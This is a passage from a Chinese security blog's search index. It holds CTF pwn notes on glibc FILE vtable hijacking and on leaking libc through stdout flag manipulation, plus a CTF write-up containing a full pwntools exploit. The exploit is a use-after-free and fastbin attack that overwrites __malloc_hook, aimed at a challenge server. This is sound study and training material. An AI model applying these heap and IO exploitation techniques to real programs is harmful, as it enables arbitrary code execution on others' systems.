来劫持程序流程，把vtable指向我们已经可以控制的内存，如某个chunk，随后我们有两种思路来利用\n\n直接改写vtable中的函数指针(需要有任意地址写)\n覆盖vtable的指针-&gt;指向我们控制的内存，在其中布置函数指针\n\n演示\n下面用CTF-wiki的例子来演示\n在此之前我们得知道_IO_FILE_plus位于哪，对于fopen 是位于堆内存中 ， 而对于stdin\\stdout\\stderr是位于libc.so中的\nint main(void)&#123;    printf(&quot;这里演示修改vtable中的指针&quot;)    FILE *fp;    long long *vtable_ptr;    fp=fopen(&quot;flag.txt&quot;,&quot;rw&quot;);    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable    vtable_ptr[7]=0x41414141 //xsputn    printf(&quot;call 0x41414141&quot;);&#125;\n\n在64位系统下vtable地址在_IO_FILE_plus的偏移为0xd8 ，由于printf会调用vtable中的xsputn所以我们就可以更改xsputn为某个目标地址，xsputn是vtable中的第八项源码位于我的IO利用之利用stdout泄露libc中 \n\nctf-wiki: \n在 xsputn 等 vtable 函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus 地址。\n\n比如调用 printf，传递给 vtable 的第一个参数就是_IO_2_1_stdout_的地址。\n利用：\n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#define system_ptr 0x7ffff7a52390;int main(void)&#123;    FILE *fp;    long long *vtable_ptr;    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable    memcpy(fp,&quot;sh&quot;,3);    vtable_ptr[7]=system_ptr //xsputn    fwrite(&quot;hi&quot;,2,1,fp);&#125;\n\n下面用gdb调试一下看看怎么个事\n运行到14行，可以看见我们的vtabel_ptr已经变成了_IO_file_jumps的地址了\n\n查房！里面的成员第八项就是我们的xsputn直接执行vtable_ptr[7]=system_ptr \n\n按理来说我们是可以直接修改的但是\npwndbg&gt; Program received signal SIGSEGV, Segmentation fault.0x00005555555551f0 in main () at IO_vtable.c:1616          vtable_ptr[7]=system_ptr //xsputn\n\n我们这里显示段错误\n\n原因：在目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。 IO_FILE_plus 结构中的 vtable 是 const 修饰的, 默认的在 libc 只读数据段, 所以 vtable 中的函数指针不能直接更改 –&gt; const struct _IO_jump_t *vtable;\n\n但是我们可以使用第二种思路-&gt;在可控的内存中伪造 vtable \n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#define system_ptr 0x7ffff7a52390;int main(void)&#123;    FILE *fp;    long long *vtable_addr,*fake_vtable;    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);    fake_vtable=malloc(0x40);    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset    vtable_addr[0]=(long long)fake_vtable; //修改vtable指针为我们可控的内存地址    memcpy(fp,&quot;sh&quot;,3);    fake_vtable[7]=system_ptr; //xsputn    fwrite(&quot;hi&quot;,2,1,fp);&#125;\n\n程序的逻辑和原来的差不多，只是我们的vtable_addr改为了 IO_FILE_plus 结构（这里是fp）中的 vtable指针地址，然后我们把这个指针改为我们可以控制的内存地址–&gt;fake_vtable，然后将fp的头部改为’sh’(因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递)，把fake_vtable第八项成员改为system的地址，这样当我们调用fwrite的时候就会执行system(‘sh’)\n同样，如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\\stdout\\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。\n参考：伪造vtable劫持程序流程 - CTF Wiki\n","categories":["PWN"],"tags":["pwn_IO"]},{"title":"IO_FILE利用之利用_IO_2_1_stdout泄露libc","url":"//about/links/2025/11/16/IO_FILE%E5%88%A9%E7%94%A8%E4%B9%8B%E5%88%A9%E7%94%A8_IO_2_1_stdout%E6%B3%84%E9%9C%B2libc","content":"IO_FILE利用之利用_IO_2_1_stdout泄露libcFILE结构FILE在linux系统的标准IO库使用来描述文件结构，称之为文件流。这里提及的”流“其实是一种抽象的概念，无论是硬件还是软件其实都没有”流“一说，只是人们为了便于描述数据的流向而创造的名称。比如说当我们要输出磁盘中记录的数据，那么在计算机中首先会将磁盘中的数据加载进内存，那么磁盘–&gt;内存这种流向就被抽象叫做”流“\nFILE结构在程序执行fopen函数时会自动进行创建，并分配在堆中。我们常定义一个指向FILE结构的指针来接收这个返回值\nFILE结构定义在libio.h:\nstruct _IO_FILE &#123;  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags  /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;   /* Current read pointer */  char* _IO_read_end;   /* End of get area. */  char* _IO_read_base;  /* Start of putback+get area. */  char* _IO_write_base; /* Start of put area. */  char* _IO_write_ptr;  /* Current put pointer. */  char* _IO_write_end;  /* End of put area. */  char* _IO_buf_base;   /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */#define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  /*  char* _save_gptr;  char* _save_egptr; */  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;struct _IO_FILE_complete&#123;  struct _IO_FILE _file;#endif#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001  _IO_off64_t _offset;# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T  /* Wide character stream stuff.  */  struct _IO_codecvt *_codecvt;  struct _IO_wide_data *_wide_data;  struct _IO_FILE *_freeres_list;  void *_freeres_buf;# else  void *__pad1;  void *__pad2;  void *__pad3;  void *__pad4;  size_t __pad5;  int _mode;  /* Make sure we don&#x27;t get into trouble again.  */  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];#endif&#125;;\n\n一个进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表的头部用全局变量 _IO_list_all表示，通过这个值我们能遍历所有的FILE结构。\n如图：\n\n在标准I&#x2F;O库中，每个程序启动时stdin、stdout、stderr这三个文件流会自动打开。因此在初始状态下，_IO_list_all指向了一个由这些文件流构成的链表，但是这三个文件流是位于libc.so的数据段上，而我们使用fopen创建的文件流是分配在堆内存上的\n_IO_FILE_plus结构\n在FILE结构外还包裹了另一种结构_IO_FILE_plus,其中包含了一个重要的指针vtable(虚表)指向了一系列函数指针：\nstruct _IO_FILE_plus&#123;  FILE file;  const struct _IO_jump_t *vtable;&#125;;\n\n\n虚函数表是一个存储在内存中的表格，其中包含了类中所有虚函数的指针，每个类都有自己的虚函数表。当调用虚函数时，编译器通过虚函数表来确定应该调用哪个函数的实现。\n\n这里可以看见vtable是IO_jump_t 类型的指针，IO_jump_t中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针。也就是说，如果使用_IO_FILE_plus去定义一个结构体指针的话，我们既可以使用IO_FILE中的结构体成员变量，也能使用IO_jump_t中的函数指针\nstruct _IO_jump_t&#123;    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);&#125;;\n\n_flags规则\n_flag是IO_FILE结构体中的第一个成员变量，这个成员变量在利用 _IO_2_1_stdout泄露libc的时候起了很重要的作用。\n_flag规则： _flag的高两位字节是由libc固定的，不同的libc可能存在差异，但是基本上都是0xfbad0000\n高两位字节的作用是作为一个标识，标志这是一个什么文件。而低两位的位数决定了程序的执行状态，低两位规则如下：\n#define _IO_MAGIC       0xFBAD0000  // 文件流结构体的魔数#define _OLD_STDIO_MAGIC 0xFABC0000 // 旧版 stdio 的魔数（兼容用）#define _IO_MAGIC_MASK  0xFFFF0000  // 魔数掩码（提取高 16 位）#define _IO_USER_BUF   1   // 用户自定义缓冲区（关闭时不释放）#define _IO_UNBUFFERED 2   // 无缓冲模式（直接操作文件描述符）#define _IO_NO_READS   4   // 禁止读操作（只写模式）#define _IO_NO_WRITES  8   // 禁止写操作（只读模式）#define _IO_EOF_SEEN   0x10  // 已检测到文件结束符（EOF）#define _IO_ERR_SEEN   0x20  // 发生 I/O 错误（如磁盘故障）#define _IO_BAD_SEEN   0x4000 // 流处于不可恢复的错误状态#define _IO_DELETE_DONT_CLOSE 0x40  // 关闭时不调用 close(_fileno)#define _IO_LINKED            0x80  // 与其他流链接（共享缓冲区）#define _IO_IN_BACKUP         0x100 // 正在备份数据（如内存映射回写）#define _IO_LINE_BUF          0x200 // 行缓冲模式（遇到 &#x27;\\n&#x27; 刷新）#define _IO_TIED_PUT_GET      0x400 // 读写指针逻辑绑定（如 fgetpos/fsetpos）#define _IO_CURRENTLY_PUTTING 0x800 // 当前处于写操作中#define _IO_IS_APPENDING      0x1000 // 追加模式（文件打开时指针在末尾）#define _IO_IS_FILEBUF        0x2000 // 文件缓冲区（非终端或管道）#define _IO_USER_LOCK 0x8000  // 用户自定义锁（控制并发访问）\n\n在执行流程中一般会将_flag和定义常量进行按位与运算，并根据与运算的结构进行判断如何执行。\nputs()函数执行流程\n_IO_puts –&gt; _IO_new_file_xsputn\nputs()函数在源码中的表现形式为_IO_puts:\nint_IO_puts (const char *str)&#123;  int result = EOF;              // 初始化返回值为 EOF（表示失败）  size_t len = strlen (str);     // 计算字符串长度（不含 &#x27;\\0&#x27;）  _IO_acquire_lock (stdout);     // 获取 stdout 的锁（防止并发写入）  // 检查流的虚表偏移和宽字符模式是否合法  if ((_IO_vtable_offset (stdout) != 0       || _IO_fwide (stdout, -1) == -1)  // 确保流处于字节模式（非宽字符）      &amp;&amp; _IO_sputn (stdout, str, len) == len  // 将字符串写入缓冲区      &amp;&amp; _IO_putc_unlocked (&#x27;\\n&#x27;, stdout) != EOF)  // 写入换行符    result = MIN (INT_MAX, len + 1);  // 成功时返回写入字符数（含 &#x27;\\n&#x27;）  _IO_release_lock (stdout);       // 释放锁  return result;                   // 返回结果&#125;\n\n这里可以看到_IO_puts在过程当中调用了一个叫做_IO_sputn函数（_IO_fwrite也会调用这个），_IO_sputn其实是一个宏，它的作用就是调用_IO_2_1_stdout_中的vtable所指向的_xsputn，也就是_IO_new_file_xsputn函数\n_IO_new_file_xsputn –&gt; _IO_OVERFLOW\nsize_t_IO_new_file_xsputn (FILE *f, const void *data, size_t n)&#123;  const char *s = (const char *) data;  size_t to_do = n;  int must_flush = 0;  size_t count = 0;  if (n &lt;= 0)    return 0;  /* This is an optimized implementation.     If the amount to be written straddles a block boundary     (or the filebuf is unbuffered), use sys_write directly. */  /* First figure out how much space is available in the buffer. */  if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    &#123;      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;      if (count &gt;= n)\t&#123;\t  const char *p;\t  for (p = s + n; p &gt; s; )\t    &#123;\t      if (*--p == &#x27;\\n&#x27;)\t\t&#123;\t\t  count = p - s + 1;\t\t  must_flush = 1;\t\t  break;\t\t&#125;\t    &#125;\t&#125;    &#125;  else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */  /* Then fill the buffer. */  if (count &gt; 0)    &#123;      if (count &gt; to_do)\tcount = to_do;      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);      s += count;      to_do -= count;    &#125;  if (to_do + must_flush &gt; 0)    &#123;      size_t block_size, do_write;      /* Next flush the (full) buffer. */      if (_IO_OVERFLOW (f, EOF) == EOF)\t/* If nothing else has to be written we must not signal the\t   caller that everything has been written.  */\treturn to_do == 0 ? EOF : n - to_do;      /* Try to maintain alignment: write a whole number of blocks.  */      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;      do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);      if (do_write)\t&#123;\t  count = new_do_write (f, s, do_write);\t  to_do -= count;\t  if (count &lt; do_write)\t    return n - to_do;\t&#125;      /* Now write out the remainder.  Normally, this will fit in the\t buffer, but it&#x27;s somewhat messier for line-buffered files,\t so we let _IO_default_xsputn handle the general case. */      if (to_do)\tto_do -= _IO_default_xsputn (f, s+do_write, to_do);    &#125;  return n - to_do;&#125;\n\n首先进入函数之后判断输出缓冲区还有多少空间，这里是由_IO_write_end - _IO_write_base得来的，这两个是FILE结构体中的两个成员变量，分别是输出结束地址和真实输出地址\n关键代码：\n1335    if (__IO_OVERFLOW (f, EOF) == EOF)1336      /* If nothing else has to be written we must not signal the 1337         caller that everything has been written. */1338      return to_do == 0 ? EOF : n - to_do;\n\n经过上述最后一步的判断，如果还有剩余则说明输出缓冲区未建立或者空间已满，那么就需要通过_IO_OVERFLOW函数来建立或清空缓冲区，这个函数主要是实现刷新缓冲区或建立缓冲区的功能。在vtable中为__overflow\n_IO_new_file_overflow –&gt; _IO_do_write\nint_IO_new_file_overflow (FILE *f, int ch)&#123;  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;      f-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  /* If currently reading or no buffer allocated. */  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)    &#123;      /* Allocate a buffer if needed. */      if (f-&gt;_IO_write_base == NULL)\t&#123;\t  _IO_doallocbuf (f);\t  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);\t&#125;      /* Otherwise must be currently reading.\t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\t logically slide the buffer forwards one block (by setting the\t read pointers to all point at the beginning of the block).  This\t makes room for subsequent output.\t Otherwise, set the read pointers to _IO_read_end (leaving that\t alone, so it can continue to correspond to the external position). */      if (__glibc_unlikely (_IO_in_backup (f)))\t&#123;\t  size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;\t  _IO_free_backup_area (f);\t  f-&gt;_IO_read_base -= MIN (nbackup,\t\t\t\t   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);\t  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;\t&#125;      if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)\tf-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;      if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\tf-&gt;_IO_write_end = f-&gt;_IO_write_ptr;    &#125;  if (ch == EOF)    return _IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */    if (_IO_do_flush (f) == EOF)      return EOF;  *f-&gt;_IO_write_ptr++ = ch;  if ((f-&gt;_flags &amp; _IO_UNBUFFERED)      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#x27;\\n&#x27;))    if (_IO_do_write (f, f-&gt;_IO_write_base,\t\t      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)      return EOF;  return (unsigned char) ch;&#125;\n\n上述代码关键在于 _IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) ，我们需要成功执行 _ IO _ do_write()函数，这个函数作用是调用write输出输出缓冲区，传入的参数分别为：stdout结构体、_IO_write_base（输出缓冲区起始地址）和size（_IO_write_end - _IO_write_base计算得来）\n这时，我们可以事先在stdout的_IO_write_base的位置部署要输出的起始地址，那么再去利用_IO_do_write函数，即可打印部分内存地址，打印出来的内容就包含我们所需要泄露的libc\n为了执行_ IO _ do_write()函数，我们得绕过前面的检查\n首先：\nif (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */   &#123;     f-&gt;_flags |= _IO_ERR_SEEN;     __set_errno (EBADF);     return EOF;   &#125;\n\n这里判断_flags的标志位是否包含 _IO_NO_WRITES，\n#define _IO_MAGIC 0xFBAD0000 /* 魔数 */#define _IO_NO_WRITES  8   // 禁止写操作（只读模式）\n\n为了通过这个检查，我们得将此处的运算计算为假，所以我们只需要将_flag设置为0xfbad0000即可\n\n _flag&#x3D;0xFBAD0000  –&gt;  11111011101011010000000000000000  (第三位为0即可)\n_IO_NO_WRITES &#x3D; 8 –&gt; 00000000000000000000000000001000\n\n第二个大检查：\nif ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)&#123;...&#125;\n\n由于_IO_write_base我们会先覆盖地址，所以 f-&gt;_IO_write_base == NULL必定为假，接下来我们令(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 为假即可,设置_flags &#x3D; 0xfbad0800\n#define _IO_MAGIC 0xFBAD0000#define _IO_CURRENTLY_PUTTING 0x800f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = 1_flags = 0xfbad0800\n\n第三个检查：\nif (ch == EOF)  return _IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);\n\n由于前面传进来的参数就是EOF所以不用管\nif (__IO_OVERFLOW (f, EOF) == EOF)\n\n绕过了这些检查后\n我们就成功进入了_IO_do_write() 函数\n_IO_new_do_write –&gt; new_do_write\nint_IO_new_do_write (FILE *fp, const char *data, size_t to_do)&#123;  return (to_do == 0\t  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;&#125;\n\n我们进入_IO_do_write() 函数之后就会进入 _IO_new_do_write函数，该函数只是调用了new_do_write函数，参数分别为stdout结构体，输出缓冲区起始地址，输出长度\n跟进new_do_write函数\nnew_do_write –&gt; _IO_SYSWRITE\nstatic size_tnew_do_write (FILE *fp, const char *data, size_t to_do)&#123;  size_t count;  if (fp-&gt;_flags &amp; _IO_IS_APPENDING)    /* On a system without a proper O_APPEND implementation,       you would need to sys_seek(0, SEEK_END) here, but is       not needed nor desirable for Unix- or Posix-like systems.       Instead, just indicate that offset (before and after) is       unpredictable. */    fp-&gt;_offset = _IO_pos_BAD;  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    &#123;      off64_t new_pos\t= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);      if (new_pos == _IO_pos_BAD)\treturn 0;      fp-&gt;_offset = new_pos;    &#125;  count = _IO_SYSWRITE (fp, data, to_do);  if (fp-&gt;_cur_column &amp;&amp; count)    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0\t\t       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\t\t       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);  return count;&#125;\n\n关键代码：count = _IO_SYSWRITE (fp, data, to_do);首先明确目标是进入这个函数，该函数会执行系统调用write。\nif (fp-&gt;_flags &amp; _IO_IS_APPENDING)else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)\n\n接下来就是考虑这两个判断语句了我们进入第一个if语句的话可以执行count = _IO_SYSWRITE (fp, data, to_do);,所以我们就不需要满足else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)的条件了（这个条件比较难满足）\n所以我们将_flags设置为0xfbad1000即可\n#define _IO_MAGIC 0xFBAD0000#define _IO_IS_APPENDING 0x1000fp-&gt;_flags &amp; _IO_IS_APPENDING = 1_flags = 0xfbad1000\n\n接下来就可以执行 _IO_SYSWRITE (fp, data, to_do)函数打印出我们一开始设置的要输出的起始地址，从而达到泄露libc的目的了\n总结：\n我们得满足以下条件来执行_IO_SYSWRITE (fp, data, to_do)：\n\n_flags &amp; _IO_NO_WRITES = 0_flags &amp; _IO_CURRENTLY_PUTTING = 1_flags &amp; _IO_IS_APPENDING = 1_flags = 0xFBAD1800\n\n设置_IO_write_base指向想要泄露的位置，_IO_write_ptr指向泄露结束的地址(不需要一定设置指向结尾，stdout结构中自带地址也足够泄露libc)\n\n\n\n参考blog：https://hollk.blog.csdn.net/article/details/113845320\n\n","categories":["PWN"],"tags":["pwn_IO"]},{"title":"第三届古剑山-PWN-Ezuaf","url":"//about/links/2025/11/30/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%8F%A4%E5%89%91%E5%B1%B1-PWN-ezuaf","content":"第三届古剑山-PWN-ezuaf看题目名猜到是存在uaf的\n保护：\n&gt; checksec ezuaf[*] &#x27;/home/1angx/Desktop/jiaoben/gu jian shan/ezuaf/ezuaf&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x3ff000)    Stripped:   No\n\n主函数：\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  puts(&quot;Welcome to CTF!&quot;);  while ( 1 )  &#123;    menu();    switch ( (unsigned int)get_num() )    &#123;      case 1u:        add();        break;      case 2u:        delete();        break;      case 3u:        show();        break;      case 4u:        edit();        break;      case 5u:        exit(0);      default:        puts(&quot;invalid!&quot;);        break;    &#125;  &#125;&#125;\n\nadd():\nint add()&#123;  unsigned int num; // [rsp+8h] [rbp-8h]  int v2; // [rsp+Ch] [rbp-4h]  printf(&quot;Input the index of the note:&quot;);  num = get_num();  if ( num &gt;= 0xA )    exit(1);  printf(&quot;Input the length of the note:&quot;);  v2 = get_num();  *(_QWORD *)&amp;notes[4 * num + 2] = malloc(v2);  notes[4 * num] = v2;  printf(&quot;please enter your note:&quot;);  read(0, *(void **)&amp;notes[4 * num + 2], (int)notes[4 * num]);  return puts(&quot;you have a new note!&quot;);&#125;\n\nedit():\nssize_t edit()&#123;  unsigned int num; // [rsp+Ch] [rbp-4h]  printf(&quot;enter the index of note:&quot;);  num = get_num();  if ( num &gt;= 0xA )    exit(1);  printf(&quot;please enter your note:&quot;);  return read(0, *(void **)&amp;notes[4 * num + 2], (int)notes[4 * num]);&#125;\n\nshow:\nint show()&#123;  unsigned int num; // [rsp+Ch] [rbp-4h]  printf(&quot;Input the index of the note:&quot;);  num = get_num();  if ( num &gt;= 0xA )    exit(1);  if ( !*(_QWORD *)&amp;notes[4 * num + 2] )    exit(1);  printf(&quot;The content of the note:&quot;);  return puts(*(const char **)&amp;notes[4 * num + 2]);&#125;\n\ndelete:\nint delete()&#123;  unsigned int num; // [rsp+Ch] [rbp-4h]  printf(&quot;enter index:&quot;);  num = get_num();  if ( num &gt;= 0xA )    exit(1);  if ( free_times &gt; 0 )  &#123;    free(*(void **)&amp;notes[4 * num + 2]); //uaf    --free_times;  &#125;  notes[4 * num] = 0;  return puts(&quot;say goodbye to your notes!&quot;);&#125;\n\n确实存在uaf，可以直接打uaf＋double_free\n思路：\n1.泄露libc：直接用unsortedbin泄露出main_arena算出libc基地址\n2.直接fastbin_attack劫持fd指针改为malloc_hook，把malloc_hook挂进链表，本来打算打one_gadget的但是突然看见有后门直接劫持到后门\nexp:\nfrom pwn import *context.log_level = &#x27;debug&#x27;psl = lambda data : p.sendline(data)ps = lambda data : p.send(data)pc = lambda data : p.recvuntil(data)ph = lambda des,data : print(des+hex(data))psla = lambda data1,data2 : p.sendlineafter(data1,data2)uu64 = lambda : u64(pc(b&#x27;\\x7f&#x27;)[-6::].ljust(8,b&#x27;\\x00&#x27;))binary_name = &#x27;./ezuaf&#x27;HOST = &quot;47.107.139.41&quot;PORT = 43869choice = input(&quot;Please input yes-&gt;Process,no-&gt;Remote&quot;)if &quot;y&quot; in choice:    p = process(binary_name)elif &quot;n&quot; in choice:    p = remote(HOST,PORT)libc = ELF(&quot;./libc.so.6&quot;)e = ELF(binary_name)def bug():    gdb.attach(p)    pause()# ========== FUNTION ===========def choose(chose):    psla(&quot;your choice:&quot;,str(chose))def add(index,size,context):    choose(1)    psla(&quot;:&quot;,str(index))    psla(&quot;:&quot;,str(size))    psla(&quot;:&quot;,context)def delete(index):    choose(2)    psla(&quot;:&quot;,str(index))def show(index):    choose(3)    psla(&quot;:&quot;,str(index))def edit(index,context):    choose(4)    psla(&quot;:&quot;,str(index))    psla(&quot;:&quot;,context)# ========== Exploit 开始 ==========def exp():    note = 0x6020E0    backdoor = 0x400886    add(0,0x100,b&#x27;jian&#x27;)    add(1,0x100,b&#x27;jian&#x27;)    delete(0)        show(0)\t    libc_base = uu64()-0x3c4b78    ph(&quot;libc_base&quot;,libc_base)    malloc_hook = libc_base+libc.sym[&#x27;__malloc_hook&#x27;]    ph(&quot;malloc_hook&quot;,malloc_hook)        add(2,0x60,b&#x27;fast1&#x27;)    add(3,0x60,b&#x27;fast2&#x27;)    delete(0)    edit(2,p64(malloc_hook-0x23))    add(4,0x60,b&#x27;cccc&#x27;)    add(5,0x60,p64(0)+p64(0)+b&#x27;a&#x27;*0x3+p64(backdoor))    add(6,0x10,b&#x27;a&#x27;)    #bug()    p.interactive()        for i in range(100):     exp()    a = p.recvline    if &quot;flag&quot; in a :       pause()   \n\n","categories":["PWN"],"tags":["WP"]}]